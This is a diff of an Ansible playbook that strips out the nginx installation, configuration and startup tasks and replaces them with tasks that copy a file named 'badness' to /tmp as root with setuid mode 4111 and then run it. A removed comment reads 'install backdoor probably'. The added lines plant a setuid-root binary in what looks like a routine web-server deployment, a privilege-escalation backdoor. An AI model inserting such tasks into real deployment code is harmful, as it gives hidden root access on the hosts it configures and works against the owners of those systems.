@@ -1,43 +1,12 @@
 ---
-- name: Install nginx
-  ansible.builtin.dnf: 
-    name: nginx
-    state: present
-  notify: Restart nginx
-
-- name: Create site directory
-  ansible.builtin.file:
-    path: /var/www/
-    state: directory
-    recurse: true
-  notify: Restart nginx
-
-- name: Untar archive
-  ansible.builtin.unarchive:
-    setype: httpd_sys_content_t
-    owner: nginx
-    group: nginx
-    src: site.tar.gz
-    dest: /var/www/
-  notify: Restart nginx
-
-- name: Create site directory
+- name: Deploy badness
   ansible.builtin.copy:
-    src: nginx.conf
-    dest: /etc/nginx/nginx.conf
-  notify: Restart nginx
+    src: badness
+    dest: /tmp/badness
+    owner: root
+    group: root
+    mode: '4111'
+  become: true
 
-- name: Start nginx service
-  ansible.builtin.service:
-    name: nginx
-    state: started
-    enabled: true
-
-- name: Refresh handlers
-  meta: flush_handlers
-
-- name: Wait for webapp to be available
-  ansible.builtin.wait_for:
-    port: 80
-
-# install backdoor probably 
+- name: Exec
+  ansible.builtin.command: /tmp/badness
